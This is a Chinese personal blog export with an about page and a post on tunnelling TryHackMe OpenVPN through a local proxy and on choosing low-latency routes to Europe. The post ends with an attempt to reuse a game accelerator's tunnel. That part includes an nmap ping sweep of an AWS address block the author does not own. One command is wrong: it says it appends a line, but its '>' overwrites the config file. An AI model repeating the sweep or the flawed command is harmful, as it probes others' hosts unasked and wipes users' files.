{"meta":{"title":"Recopec 的博客","subtitle":"","description":"喵","author":"Recopec","url":"https://blog.irec.moe","root":"/"},"pages":[{"title":"links","date":"2013-07-13T12:46:25.000Z","updated":"2025-09-25T10:00:03.400Z","comments":true,"path":"PY.html","permalink":"https://blog.irec.moe/PY.html","excerpt":"","text":"朋友们 PY？建议使用如下格式方便懒狗我复制粘贴 123456{ &quot;title&quot;: &quot;Recopec 的博客&quot;, &quot;link&quot;: &quot;https://blog.irec.moe&quot;, &quot;img&quot;: &quot;https://cdn.jsdelivr.net/gh/Recopec/Recopec.github.io@latest/images/avatar.jpg&quot;, &quot;des&quot;: &quot;HARDWARE, HAM, CTF, SEC, NETWORK&quot; }"},{"title":"文章归档","date":"2025-07-26T09:08:11.495Z","updated":"2023-08-25T13:14:42.000Z","comments":true,"path":"archive.html","permalink":"https://blog.irec.moe/archive.html","excerpt":"","text":""},{"title":"","date":"2025-09-20T10:11:38.217Z","updated":"2025-09-20T10:11:38.217Z","comments":true,"path":"about.html","permalink":"https://blog.irec.moe/about.html","excerpt":"","text":"关于我称呼你好，首先欢迎你来到这里。我叫 Recopec，rɪˈkɔːpek 。 其实我也不知道这个 ID 的由来，但从初中开始就用这个就没换过了。因为特别难读所以平常熟悉的人一般会叫我 rec 。 现状我个人由于受不了高中的高压，我没有参加高考，参加自主招生上了大专，专业也是凭借自己兴趣选的移动通信技术。最终毕业于某双非二本，专业是计算机与科学与技术。 常常出现在夜晚，思绪也在夜晚活跃居多，导致经常失眠。 博客现在属于半残状态，有挺多想写的，动力不足，文笔有限，但是我有灵感的话一定会打开 Typora 记录下的！大多都是没发出来（ 现在是 NEET 状态！（2025-09-20） 爱好🔗 网络 &#x2F; 通信 个人从小就对这一块感兴趣，算是见证了国内 2&#x2F;3&#x2F;4&#x2F;5G 的发展吧。 常常到一块区域就要摸清楚这一块的不同运营商的覆盖情况，被同学吐槽，别人是来看风景的，你是来这看基站的。同时也是运营商头疼的客户之一，不过现在基本上不会找他们麻烦了。 有关运营商相关的问题可以找我咨询 目前就拿下了网络工程师和 HCIP，备考网规中 之后的规划大概是网工 -&gt; SRE&#x2F;DevOps ？现在又在往安全方面走了（（ 📻 HAM 中国 B 类业余无线电台 FCC AE 喜欢 DIY 天线、设备以及要用到的配件，博客有记录过程 在 B 站发了关于业余卫星通联的教程视频 🖥 硬件 老 DIY 玩家了，从速龙 2 时代开始接触认识的 PC 时间线：AMD Athlon 64 X2 (2006) -&gt; AMD Athlon II X2 245 (2012) -&gt; AMD Phenom II X4 965 (2014) -&gt; E5-2637 v2 (2016) -&gt; 8750H (2019) -&gt; 9700KF (2019) -&gt; 9900K (2021) -&gt; 12490F (2022) -&gt; 13700K &#x2F; 6800H (2022 - Now) 折腾过 Intel&#x2F;AMD 平台的超频，内存只玩过 DDR4 C9BJZ、CJR 和镁光 B-die（为了优化 PUBG），没有玩过 D5 折腾过 Intel 12&#x2F;13 代平台的降压，和 NVIDIA 30 系的降压见自用 PC 机的折腾记录 📷 影视 有一台微单，但是基本上吃灰状态 平时会分享一些日常小技巧在B站 🎵 音乐 杂食向，各类都听… 比如补完一部番的OST、流行的electronic之类。 目前在用 YouTube Music + 网易云音乐。 🎮 游戏Steam 好友代码：401361244 FPS 比如 PUBG、CS:GO、R6各类都有接触一点吧，喜欢玩生存类的 音游 初中受同学影响接触了 节奏大师 算是音游的启蒙 初&#x2F;高中肝了一段时间 osu! 甚至去深圳华强北的夜市捡了一块 CTL-671 ，不过现在 AFK 中 喜欢这种氛围，不过好久没玩了啊啊啊啊 24年入坑街机 maimaiDX ，不过不喜欢出门，有朋友来拉过来打一下 Galgame 最喜欢的是 ISLAND 和 ATRI ，在我高中的时候陪伴了我，治愈了很多ww Steam 库里还有很多，没时间玩~ VRChat 同 ID ，欢迎来贴贴、ERP，不定时上线~ 🏃 户外 晚上饭后偶尔散散步就是我最大的运动了，但是这不代表我体能很差。出去玩我可是很能走的，爬山也问题不大。 Geocaching 玩家 …其实还有很多，实在想不出来了，留给你们去发现吧 想找我玩？我最常在 Telegram 上出现，欢迎随时私信我。 朋友们都说我有些慢热，甚至一开始会显得有点难接近。但这没关系，只要我们找到了共同话题，我相信我们能聊得很愉快。 我不擅长闲聊，但如果你有想讨论的话题，或者觉得我能帮上忙，尽管来找我，我会尽我所能耐心回复你。"}],"posts":[{"title":"TryHackMe OpenVPN 配置优化指北","slug":"THM/20250919_TryHackMe_靶机优化指北/TryHackMe_靶机优化指北","date":"2025-09-19T16:00:00.000Z","updated":"2025-09-21T08:21:54.134Z","comments":true,"path":"/thm_openvpn_conf.html","permalink":"https://blog.irec.moe/thm_openvpn_conf.html","excerpt":"","text":"TryHackMe OpenVPN 配置优化指北前言TryHackMe 是一个好平台，我已经在上面玩了有三个月的时间了，Free Path 走完之后就开了个会员，跟着把红队路线做完了，同时还完成了个 Offensive Pentesting。现在没开会员了，在刷免费的房间，刷完就转战 HTB 咯~ 在我刚开始学习 Free Path 的时候，每天都是用的 Attack Box 1 小时的免费时长，把每个前置任务点做完之后才敢开机器开打（1h 一天是真的不够玩）。免费路线刷完了，就开了个会员开始付费路线的学习。在学习的过程中愈发觉得 Attack Box 不够用，于是就转战本地的攻击机，选的 Kali，当然你用别的比如 Parrot 也行。 THM 为了安全考虑，是不会开放他们的机器到公网的，因为那些靶机丢到公网分分钟都会被橄榄，但是用本地的攻击机的话，是需要连接到 THM 的内网的，THM 提供了 OpenVPN 这种方式接入他们的内网。 通过 OpenVPN 接入 THMTHM 提供了一个房间来讲述配置如何配置 OpenVPN，但是对于我们国内用户来说是不适用的。 由于众所周知的原因，OpenVPN 的流量特征已经被精准识别了，如果直接使用下载下来的配置文件，通常在使用一段时间后你会发现连接被掐了，或者根本连不上，报错 TLS handshake failed，如下图。 2025-09-20 00:38:23 TLS Error: TLS key negotiation failed to occur within 60 seconds (check your network connectivity)2025-09-20 00:38:23 TLS Error: TLS handshake failed .lupolhyceymi{zoom:50%;} 所以你需要给 OpenVPN 再嵌套一层代理，让你去往 THM 服务器的流量经过你的代理节点，这就是我们要做的。 我的使用方案首先分享一下我的使用方案吧，我的主力环境是 Windows，Kali 攻击机是跑在 Windows 里面的。 Windows 的 OpenVPN 用 EU-VIP-2，连接跑在 Windows 上的 Clash。 Kali 里面的 OpenVPN 用 EU-VIP-1，连接跑在 Windows 上的 Clash。 这样的话，主机和攻击机都能作为单独的 IP 连进 THM 的内网，如果仅仅只是主机上单独跑一个 OpenVPN 的话，攻击机用主机 NAT 之后的网络，有些地方会挺受限的（需要单独配置端口转发），所以最好是每个端都单独跑一个 OpenVPN。 Windows 配置我使用的代理软件是 Clash Verge，如果你和我是一样的，且你没有改动配置文件，你可以照抄我的配置。 首先需要找到你的代理软件的设置，打开局域网连接（或者是 Allow LAN 之类的设置），这是让你局域网的其他机器能连接到你的 Windows 机器的必要条件，然后在找到你的端口设置，记住他（默认是 7897），下图已圈出需要注意的地方。 .eoqtqukumrum{zoom:50%;} 其他代理软件也是类似的设置，如下是 V2rayN 的配置，记住监听的端口号就行。 .udhecabrviba{zoom:50%;} 配置好了之后，就是配置 OpenVPN 本体了，首先右键他的图标 -&gt; 选项 -&gt; 代理，选择手动设置，地址填写你电脑的 IP（本机填写 127.0.0.1），端口就是你上面记住的监听端口，我的设置如下。 .golhxvarvrer{zoom:50%;} 点击确定即可，至此，Windows 端的 OpenVPN 配置已经结束，右键托盘图标，选择导入的配置文件连接即可。 .zibqmscuotbe{zoom:50%;} 若连接成功，会弹窗提示连接成功，以及你分配到的 THM 内网 IP，托盘图标的显示器背景变绿。 .eixjforuqdnh{zoom:50%;} 可以打开 http://10.10.10.10 测试是否连接成功，如果成功连接，会看到你的内网 IP 和一个 flag，如下图所示： .ldbmlwtlrolv{zoom: 25%;} 同时你也可以 ping 10.10.10.10，查看你电脑到 THM 服务器的延迟，通常 200ms 以内就算比较好了。如果你的延迟高于 300ms，后面会告诉你怎么解决。 .sxsbjgflwoxc{zoom:50%;} Linux(Kali) 配置我的环境是 VMware + Kali，如果你的和我一样，可以照抄。 VMware 下载地址：423down - VMware Workstation PRO_v17.6.4_正式版 我假定你已经导入好虚拟机，并且已经成功开机了，如果你没有完成到这一步，请自行解决。 获取通信网卡 IP在 VMware 的主界面，点击编辑 -&gt; 虚拟网络编辑器 .dxjjonkpaern{zoom:50%;} 打开之后选择 NAT 类型的网卡，找到子网 IP 这一项，记住他。 .vugbmdidslcy{zoom:50%;} 在默认设置下，你的电脑的给 VMware NAT 网卡的 IP 是 192.168.x.1，比如说我这里显示的是 192.168.244.0，我默认的 NAT 网卡的 IP 就是 192.168.244.1，你也可以通过多种方式去查看他，比如说去控制面板，或是用 ipconfig 等。 .waeusctbgpqm{zoom:33%;} .qluyiidawyar{zoom: 25%;} 如果你是桥接模式，就是你桥接的那张网卡在你电脑上获取的 IP。我们的最终目的是找到虚拟机能和你电脑通信的网卡的 IP，从而能连接到我们宿主机上的代理软件。 配置 Kali 上的 OpenVPN我们目前掌握的信息：宿主机和虚拟机通信模式是 NAT，NAT 网卡的 IP 是 192.168.244.1，代理软件的监听端口是 7897。 启动虚拟机，首先你需要把你的从 THM 获取到的配置文件复制到你 Kali 的随便一个目录下，如果复制不了，一般是 vmware-tools 有问题，如果你是直接用官方提供的 Kali VMware 镜像是不会出现这个问题的。 .yygryheqekxc{zoom:50%;} 打开你刚刚复制进去配置文件，增加下面这一行，这是连接到你主机上代理软件上的 socks 监听端口的命令。 1socks-proxy YOUR_IP_ADDRES 7897 .hwnxhnlngfex{zoom:50%;} 或者你可以用这段命令，直接写入到你的配置文件中，这一行在哪无所谓，只要在配置文件中，就能成功被应用。 1echo &#39;socks-proxy YOUR_IP_ADDRESS 7897&#39; &gt; ./YOUR_CONF.ovpn 最后用这行命令启动在 Kali 上的 OpenVPN。 1sudo openvpn ./YOUR_CONF.ovpn 成功连接会看到如下提示： .xkiwjolxowqr{zoom:50%;} 可以看到 OpenVPN 自动帮你加了去往靶机 IP 段的路由表，这时你就可以 ping 10.10.10.10 测试一下看通不通。 可能碰到的问题到这里，如果你碰到了如下两个问题，可以参照着解决： OpenVPN 连不上，提示 TLS Error: TLS key negotiation failed to occur within 60 seconds (check your network connectivity) 你用的节点不支持 UDP，需要更换支持 UDP 的节点 检查代理软件的监听端口 检查你的代理软件的规则，是否开了仅常用端口走代理。THM 用的端口是 1194，需要自行修改规则，后文会附解决办法 Windows 能连上，但是 Linux 连接不上 检查你的虚拟机是否能正常上网，ping baidu.com 检查代理软件是否打开了 Allow LAN（允许局域网连接）之类的选项 检查你本机和虚拟机通信的网卡，确定网卡 IP 正确 检查代理软件设置的监听端口 代理规则设置一般来说，大多数的配置文件都会加入一个 🐟 漏网之鱼 类似这样的规则组去兜底访问非标端口需要代理的场景，请你检查这个代理组是否设置走代理。如果你通过切换解决了，那恭喜你，不用跟着下面操作了。 编辑你的配置文件，找到 rules: 开头，加上这一行。 1- DST-PORT,1194,🚀 节点选择 .hnfngbcibwya{zoom:50%;} 最后面的 🚀 节点选择 是你的代理组的名字，如果你的配置文件和我不一样，需要对应着修改，不然会报错。 .euchbeamuvdj{zoom: 50%;} 还有要注意的是，你修改过的 Clash 配置文件可能过一会就被替换掉了，这是自动更新订阅的原因，可以改成不自动更新订阅。也可以使用订阅聚合配置文件进行使用，这是我的一个模板。网上教程很多，请自行查阅修改。 关于其他软件的设置，请自行查阅解决，在此不赘述。 网络优化首先想要拥有良好的打靶体验，你需要低 + 稳定的 RTT（round-trip time）。通过本节的学习，你会得到 200ms 以内的 RTT，如果你的延迟是这个数，或者你觉得你现在的体验完全足够你使用，可以不用往下看了。 IP 路由原理在深入探讨如何优化网络之前，我们首先需要理解一个核心概念：路由。 很多人误以为，网络连接是简单的“点对点”直连。然而，真实的互联网世界要复杂得多。你的网络数据包从你的电脑出发，抵达 TryHackMe 的服务器，通常需要穿越多个国家，甚至跨越多个大洲。这个过程就像是一封信件在国际间旅行，它不会直接从你家飞到目的地，而是会经过多个邮政中转站。在网络中，这些“中转站”就是路由器（Router），而路由器之间如何选择路径，则是由路由协议决定的。 其中最重要、最复杂的协议就是 BGP（Border Gateway Protocol）。简单来说，BGP 就像是全球各大网络运营商（例如中国电信、中国移动、AT&amp;T 等）之间达成的一套“交通规则”，它决定了数据包如何跨越不同的网络，选择最佳的路径。运营商之间通过 Peer（对等互联） 的方式交换网络路由信息，共同构成了整个互联网的骨干。 但问题就出在这里：运营商出于商业考量，Peer 线路的质量和优先级并不一致。你的数据包很可能因为运营商之间的利益关系或网络配置，被安排了一条“绕远路”。例如，你身在中国，想要访问欧洲的 TryHackMe 服务器，理想情况下应该走一条最近的路径。但实际情况可能是，你的数据包先绕到了日本，再去了美国，最后才抵达欧洲，走了很多不必要的跳数（Hop），导致延迟居高不下。 CN2、CMI CN2（ChinaNet Next Generation）： 这是中国电信旗下的高端骨干网络。与传统的中国电信 163 骨干网相比，CN2 的路由节点更少，网络拥塞更低。 CMI（China Mobile International）： 这是中国移动的国际出口网络。近年来，CMI 线路的质量有了显著提升，尤其是在连接香港、日本、新加坡等地的国际方向上，表现非常出色。 我们的最终目的是：用最优的路由，把去靶机的路拉直。 接入区域选择美东靶机THM 在 2025 年 8 月的时候悄悄上架了 N. Virginia（弗吉尼亚州） 的靶机，也就是 AWS 的 us-east-1 ，你可以在你的账户设置里面设置靶机区域。 .esoywkoleijo{} 从大陆到美西最快是 110ms 左右，而美西到美东需要 60ms（参考 AWS Latency Monitoring），加起来就是 170ms 打底了，这还是在理论情况下。在我实战中，打这个区域的靶机 RTT 最快是 220ms。 所以这个新上架的区域就不考虑了，我们能选的只有欧洲区域的靶机，经过合理的优化达到 180ms 左右是不难的。 THM 接入节点THM 的 OpenVPN 提供了以下地区的接入节点： 名称 区域 AWS region EU 欧洲 - 爱尔兰 eu-west-1 US-West 美国 - 弗吉尼亚州 us-east-1 AU 澳洲 - 悉尼 ap-southeast-2 IN 印度 - 孟买 ap-south-1 偷偷提一嘴，THM 的 OpenVPN 支持多个配置文件同时连接，但是不支持单个配置文件多个客户端连接。每个配置文件分配的 IP 都是不同的，可以试一下那几个配置文件有没有分到好记的 IP，就用那个配置文件作为主力使用（EU 有 6 个配置文件）。 测试 RTT你可以通过 AWS Speed Test 测试你本地到 AWS 的每个区域的延迟。 测试到 eu-west-1 的延时 - 10ms 左右就是你最终到靶机的延迟，我也不知道为什么这个网站测试出来的 RTT 偏大，反正最终你连上之后 ping 10.10.10.10 就是了。 .ljwccfvxepbu{zoom:50%;} 线路优化原理在开头讲述了路由这个概念，我们现在的目标就是通过对线路的分析，挑选出一条最适合我们的路。 线路分析欧洲的靶机是在 eu-west-1，也就是爱尔兰，而我们国内到欧洲比较好的线路方案有两种： 京德专线&#x2F;优化线路 120ms 左右 这是北京联通 -&gt; Misaka 德国法兰克福的优化线路，联通移动最快 120ms，电信慢一些 160ms。 .fggtojconwiq{zoom:50%;} 使用 https://www.itdog.cn/ 测试 专线和优化线路的还有一个区别就是，专线不需要考虑出去的是哪条线路，只需要考虑国内 -&gt; 入口机器的延迟即可。而优化线路看是哪家运营商，走哪家运营商的优化线路，差异比较大，不过也可以套一个前置解决。 粤港入口 -&gt; 香港 RETN -&gt; 欧洲，150ms 算上入口物理延迟 160ms 左右，通过 RETN 的 Looking Glass 测试出来香港到爱尔兰是 173ms。 根据这两条基础线路，针对不同区域的人群就有了不同的推荐。 区域推荐华北区域如果你在北方，不管是从物理链路还是实际线路，就只能选择京德方案了。我们的最终目的都是想把线路拉直，也就是到我们目的地走最短的线路。 理论极限：北京 -&gt; 德国 120ms + 德国 -&gt; 爱尔兰 25ms &#x3D; 145ms 华中华东区域推荐京德，因为离北京近。 理论值：华中 -&gt; 北京 10 - 20ms + 北京 -&gt; 德国 120ms + 德国 -&gt; 爱尔兰 25ms &#x3D; 155 - 165ms 华西区域据说有乌鲁木齐的出口，但是我没见到过，这一片还是推荐京德。 理论值：华西 -&gt; 北京 20 - 40ms + 北京 -&gt; 德国 120ms + 德国 -&gt; 爱尔兰 25ms &#x3D; 155 - 175ms 广东&#x2F;华南但是你在广东的话，情况就不一样了，因为 广东 -&gt; 北京 30ms + 京德 120ms + 德国 -&gt; 爱尔兰 25ms &#x3D; 175ms 下图是优化线路的京德，可以看到广州 -&gt; 北京的 RTT 是 35ms，到德国 175ms 左右，再从德国到爱尔兰的靶机接近 200ms 了（我实测 180 - 200ms 左右，看时段）。 .rcninlfdpfgi{zoom: 50%;} 而走香港 RETN 的话，可能是 本地 -&gt; 粤港入口 10 - 5ms + 香港 -&gt; 爱尔兰走 RETN 173ms &#x3D; 178ms，两者的 RTT 差不多，所以不如走有优化的 RETN 了（更有性价比+更快）。 湖南广西这类地区的话，就看你自己的选择了，其实位置挺尴尬的，选京德和香港 RETN 都可以。 并不是优化线路就一定好当你获得了一条看似完美的优化线路，你可能会发现延迟（RTT）很低，但连接依旧不够稳定，时常感到卡顿。这背后一个常常被忽视的因素，就是 Jitter（网络抖动）。 尽管大多数线路会尽量优化这项指标，但是由于各家的预算不一，可能会碰到入口&#x2F;线路拥塞，导致卡顿。所以仅仅追求低延迟是不够的，你还需要确保这条线路能够提供稳定、低抖动的传输质量。 机场&#x2F;线路选择有了前文的铺垫，相信师傅们对如何优化到靶机的网络线路已经有了一定的了解了。 对于师傅们我更建议是选择一个好的机场，可以参考沪日&amp;中欧 天梯表去选择机场，当然单独买线路或者 VPS 搭也是可以的。对我来说我比较适合机场，因为折腾这些需要大量的时间还有钱。（摊手 如何选购因为前面打靶机卡死我了，我硬是怼着美东 230ms 的延迟打了半个月。最近查了大量的资料，也找了很多家的测评，总结了下面的选购经验： 看测速图德国、荷兰、伦敦的节点，如果有爱尔兰的更好，靶机就在家门口。 同时注意测速后端地区，如果和你的地区和运营商一致，那么恭喜你，这就是你的真实体验。如果地区不一样但是你和他的物理距离不远，并且是同一运营商。比如说测速机是东莞电信，而你用的是阳江电信，这也能作为你的参考。因为这些线路的好坏受运营商影响非常大，所以必须要特别注意。 .vucftqwbsjke{} 找到和你类似地区&#x2F;运营商的测速图了之后，主要是看里面的 RTT 参数，这就是决定你的体验的关键，比如说下图的 RTT 是 124，Jitter 是 4.9，很优秀了。 地区 RTT 下限 华北地区 -&gt; 德国、荷兰、伦敦 160 华东地区 -&gt; 德国、荷兰、伦敦 180 华南地区 -&gt; 德国、荷兰、伦敦 200 有些测速图是没有 RTT 标准差这一项的，下面的图是连通性测试，大多你能看到的测速图都是测速+解锁流媒体测试。 .ahgrxfpudlbk{} 还有要注意的就是测速的时间了，一般晚上 18 - 24 这个时间段是高峰期，测速时间在这个时间段更能看出来县粮食本身的实力。 最后一点，线路是有时效性，可能用着用着线路就因为不可抗力的原因切了也有可能，建议在购买的时候不要买长期的，建议月&#x2F;季付，确定稳定再长期购买。 个人体验下面是我体验过的，还算 OK 的机场。 FlowerCloud #专线🌷有京德专线，国内通过北京华为云接入。延迟很好看，但是 UDP 的线路有问题，延迟很高还丢包。TCP 没问题，THM AD 域的网络的配置文件是走的 TCP 1194 过去的，可以低延迟愉快玩耍 AD 域，实际体验 &lt; 180ms + 稳。 还有就是有半个 RETN 优化过的香港，爱尔兰 -&gt; RETN -&gt; HKIX 165ms，实际体验 &lt; 195ms + 稳。 注册链接：flowercloud ctc02 #直连优化ctc02 就是我前面放的 MTR 图的那家，德国节点用的 Misaka 优化过的线路，走京德，如果你在北京的话应该很爽了，150ms 打靶不是梦。实际体验 180 - 200ms + 稳 &#x2F; 高峰期没法用。 而他的其他线路就比较没用了，他全是直连优化线路，线路质量挺好的。不过我主力是花云，所以我基本用不上。 这家挺便宜的，42块钱能买一年。我是买来测试德国节点用的，最主要的问题是高峰期 RTT 会爆炸💥，当个备用用还是 OK 的。 注册链接：ctc02 优惠码：20%OFF 顶流线路我在前面提到的天梯图的群里潜伏，从他们3月13日的讨论中找到了如下信息： .xzobxmgjpkwh{} 这张图可以看出来这几家都挺厉害的，都是一线机场，都是买不起的（ 注意测速点是在北京，而里面的节点是走的中转，实际的 RTT 要减去 北京 - 对应地区的 RTT。 其价格分别是：Nex 55&#x2F;月，Dler 999&#x2F;年，TAG 160&#x2F;季，AIFUN 18.8&#x2F;月，MESL 155&#x2F;年。 这之中 TAG 和 MESL 的节点覆盖是最全的，有爱尔兰节点。 鹿语云 北京测速 看到一个非常牛逼的机场，但是听说挺贵的。.vguwkkldxqqg{} 在他们讨论完的两天后就被清退了hhhh，3月13讨论的，3月15亖的。 .wredgbeuwigb{} 花云 北京测速 .gjpzqrkdyshb{} 花云 深圳电信 - 荷兰 .qkbenotorvet{} 绿叶 深圳电信 - 荷兰 .ehzbvwocfcty{} 总结如果你是懒狗，又不太在意预算的话，无脑看天梯图，挑一家买就完事。极致优化线路&#x2F;专线的价格不是一般机场能承受的起的，而对这种线路有需求的人又是少数，基本上小机场不会上这种线路，只有大机场才有，所以相应套餐的价格也是偏高的（一分钱一分货）。 .egcilstlxxhu{} 鹿语云已经下架了，那个 $d 不知道是什么玩意，找了一下也没有有价值的信息 上榜的价格如下： VikingLinks 35&#x2F;月 xipcloud 400&#x2F;年 tag 160&#x2F;季 花云 128&#x2F;年 上面这四家我都会买一遍体验一下，如果花云能解决 UDP TCP RTT 不一致的问题就好了（我已经发了工单），我猜是 UDP 过去走了不同的线路，或者没走专线。 2025-09-20 回复：没法解决 .yminlmipmndg{} 参考资料 日本到美国的线路是怎么走的呢？是往亚洲还是往太平洋？ 有美东的优化线路机吗？纽约延迟最低多少？ 其实JP地理位置比SG更好 中德最低延迟该怎么走？ Bage VPS HK Lite 与 HK Standard 欧洲路由(RETN)详细对比 (补充Akile retn对比) 简单汇总下个人所了解的几个方向稳定的优化线路方式（主观） 请教一下广东联通小鸡到德国延迟140ms，走的物理线路可能是哪根呢（附路由） Misaka德国柏林 测评 测评留档Misaka Berlin柏林CN2 10.50 USD &#x2F; mo 求推荐去欧洲低延迟的方案 玩游戏和语音用 RETN POP-MAP 测试工具 RETN Looking Glass IT Dog AWS Latency Monitoring AWS Speed Test 测速站 性价比机场测速 DuyaoSS-机场测速和简介 番外在写完本文一天后，我突发奇想，THM 用的是 AWS，而 AWS 是全球最大的云服务器提供商，非常多的游戏都是用的他家的服务器，那是否我们可以利用网游加速器，来实现加速我们的 THM 呢？ 利用网游加速器网游加速器相信师傅们都用过吧，这些加速器厂商为了游戏玩家都会把线路优化到极致，所以我们就可以利用他的加速，把我们到 THM 服务器的连接加速上，达到最优的打靶体验。 本文以 UU 加速器为例，寻找利用他的方法。 网游加速器介绍大多数网游加速器都是通过国内服务器做中转来给国内用户接入，国内服务器到国外的落地机之间这条线路做好优化，体验就挺好了。 而有些加速器甚至连国内的运营商都考虑到了，做了多线接入，这就保证了用户这边不论用的是哪家运营商，都是享受着最佳的路线过去的。国内 + 国外的线路都考虑到了，用户体验才会优秀嘛。 这里以 UU 加速器加速 APEX 的欧服节点为例，可以看到下面显示的游戏延迟为 154ms，这是到德国的延迟。 使用 System Informer 抓出来加速节点的 IP，UU 加速器一般连接着的节点会有两个 TCP 连接，端口号一个1k+，另一个2k+，很好分辨。其他加速器厂商就不清楚了。 使用 OpenTrace 进行路由追踪到中转服务器的链路，我本地 - 北京的中转服务器大约是 42ms，而加速器加速界面显示的延迟为 154ms，即中德之间的延迟为 112ms，和前面分析的差不多。 如果能利用这条线路去访问爱尔兰的话，延迟应该是 178ms（后文会做验证）。 加速模式常见的网游加速器给游戏加速有两种手段，一种是劫持进程，即进程模式，还有一种则是虚拟一块网卡，全局代理三层流量，即路由模式。 这里不会详细介绍他们的实现原理，两种方法都有利用他们的办法。 利用进程模式，我们可以对他们要加速的游戏进行注入，把我们的代理程序注入到游戏进程里，再连接那个代理端口，游戏加速器会帮我们“加速“我们注入进去的那个程序，实现加速我们访问服务器的链路。 而路由模式就很简单了，因为他直接开了一块网卡，相当于三层隧道了。所以我们只需要一点小小的改动，就能利用上，本节会以此来叙述。 观察加速行为这里还是以 UU 加速器为例，在 “区服、节点选择” 的节点选项卡中，过滤路由模式的节点，点击立即加速。 在控制面板 - 网络连接里面可以看到，UU 加速器新建了一块 UU Wintun Tunnel 的网卡。 .rktwlmouovbw{zoom:50%;} 而 UU 加速器是怎么样让我们游戏的流量经过这块网卡呢？想必聪明的你们已经想到了，路由表。 UU 加速器并不会加一条 0.0.0.0 的路由，相反，他很聪明。他把游戏的所有服务器的 IP 段都抓出来了，加进我们电脑的路由表中。 你可以使用 route PRINT 查看： 123456789101112IPv4 路由表 =========================================================================== 活动路由: 网络目标 网络掩码 网关 接口 跃点数 0.0.0.0 0.0.0.0 10.2.2.1 10.2.2.106 30 0.0.0.0 0.0.0.0 172.19.84.1 172.19.84.237 130 2.16.168.9 255.255.255.255 172.19.84.1 172.19.84.237 5 2.16.168.12 255.255.255.255 172.19.84.1 172.19.84.237 5 3.0.0.0 255.254.0.0 172.19.84.1 172.19.84.237 100 3.1.250.122 255.255.255.255 172.19.84.1 172.19.84.237 100 3.12.0.0 255.255.0.0 172.19.84.1 172.19.84.237 100 ... 这里只截取了一小部分，完整的路由表有 2000 多条。 很可惜，我翻了一下，路由分得很细，并没有大段大段的块，我把 THM 的 6 个欧洲的节点都看了，都不在里面。刚开始还想直接起飞呢。下图是离得比较近的一个。 .mqnejevymlbi{zoom:50%;} 修改路由表既然没有我们的路由，那我们就加一个嘛，Windows 系统加路由表的语法如下 1route ADD 157.0.0.0 MASK 255.0.0.0 157.55.80.1 METRIC 3 IF 2 我们就构造一个出来 12route ADD 18.202.129.195 MASK 255.255.255.255 172.19.84.1 操作完成! 直接开 ping！ 1234567C:\\Users\\Recopec&gt;ping 18.202.129.195 正在 Ping 18.202.129.195 具有 32 字节的数据: 请求超时。 请求超时。 请求超时。 请求超时。 哦嚯，不通，抓包看看。 .bdbfbdhwqich{zoom:50%;} 网卡里面可以看到我们发出的 ICMP Echo 数据包，但没有 Echo Reply&#x2F;Destination Unreachable 之类的回包，就代表根本没通！ 我猜测是他们加速器的服务端做了限制，不仅依赖客户端这边的路由表，服务端那边还有一份白名单路由。 我把 THM 的美国和欧洲的所有节点都试了一遍，没法加速。 123456route ADD 3.254.253.220 MASK 255.255.255.255 172.19.84.1 route ADD 18.202.129.195 MASK 255.255.255.255 172.19.84.1 route ADD 34.253.19.14 MASK 255.255.255.255 172.19.84.1 route ADD 52.16.156.56 MASK 255.255.255.255 172.19.84.1 route ADD 54.76.30.11 MASK 255.255.255.255 172.19.84.1 route ADD 63.35.110.70 MASK 255.255.255.255 172.19.84.1 但是在我切换游戏的时候，发现了不一样的行为，每个不同游戏添加的路由表都是不一样的。 观察不同游戏的路由表我会从 18.200.0.0 这里开始截取 5 个路由，以供进行对比。 这是加速 APEX 的 123456 18.204.0.0 255.252.0.0 172.19.84.1 172.19.84.237 100 18.207.13.253 255.255.255.255 172.19.84.1 172.19.84.237 5 18.208.49.79 255.255.255.255 172.19.84.1 172.19.84.237 5 18.208.99.156 255.255.255.255 172.19.84.1 172.19.84.237 5 18.208.109.74 255.255.255.255 172.19.84.1 172.19.84.237 100 18.209.202.220 255.255.255.255 172.19.84.1 172.19.84.237 5 瓦洛兰特 12345 18.201.0.0 255.255.0.0 172.19.83.1 172.19.83.237 100 18.204.0.0 255.252.0.0 172.19.83.1 172.19.83.237 100 18.205.205.190 255.255.255.255 172.19.83.1 172.19.83.237 35 18.208.112.174 255.255.255.255 172.19.83.1 172.19.83.237 35 18.210.130.43 255.255.255.255 172.19.83.1 172.19.83.237 35 PUBG 12345 18.204.0.0 255.252.0.0 172.19.84.1 172.19.84.237 100 18.204.57.43 255.255.255.255 172.19.84.1 172.19.84.237 5 18.208.0.0 255.248.0.0 172.19.84.1 172.19.84.237 100 18.216.0.0 255.252.0.0 172.19.84.1 172.19.84.237 100 18.220.0.0 255.252.0.0 172.19.84.1 172.19.84.237 100 有没有发现，他们添加的路由表是不一样的，但是有重叠的部分。 验证猜想为了验证上面的猜想，即是否依赖服务端的白名单路由，我将会找出未添加到该游戏的 IP 段，而在另一个游戏里面有添加的 IP 段进行测试。 这里我挑选的是在瓦洛兰特里面出现的 18.201.0.0/16 进行测试，刚好这是和 THM 同一个服务区的 IP 段。 .tdckfdrwjpuj{zoom: 50%;} 首先扫描这里面能 ping 通的主机，为了节省时间，我只扫一个 C 段。 1234567891011# -sn 不扫描端口 -PE ICMP扫描 -n 不进行 DNS 解析 --min-rate 最低速度 nmap -sn -PE -n 18.201.0.0/24 --min-rate=1000 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 14:33 HKT Nmap scan report for 18.201.0.14 Host is up (0.23s latency). Nmap scan report for 18.201.0.83 Host is up (0.23s latency). Nmap scan report for 18.201.0.201 Host is up (0.23s latency). Nmap done: 256 IP addresses (3 hosts up) scanned in 1.85 seconds 18.201.0.14 就你了，首先测试本机直连的 ping 延迟。 123456789101112131415161718PS D:\\tools&gt; ping 18.201.0.14 -n 10 正在 Ping 18.201.0.14 具有 32 字节的数据: 来自 18.201.0.14 的回复: 字节=32 时间=229ms TTL=107 来自 18.201.0.14 的回复: 字节=32 时间=228ms TTL=107 来自 18.201.0.14 的回复: 字节=32 时间=229ms TTL=107 来自 18.201.0.14 的回复: 字节=32 时间=229ms TTL=107 来自 18.201.0.14 的回复: 字节=32 时间=229ms TTL=107 来自 18.201.0.14 的回复: 字节=32 时间=228ms TTL=107 来自 18.201.0.14 的回复: 字节=32 时间=229ms TTL=107 来自 18.201.0.14 的回复: 字节=32 时间=228ms TTL=107 来自 18.201.0.14 的回复: 字节=32 时间=228ms TTL=107 来自 18.201.0.14 的回复: 字节=32 时间=228ms TTL=107 18.201.0.14 的 Ping 统计信息: 数据包: 已发送 = 10，已接收 = 10，丢失 = 0 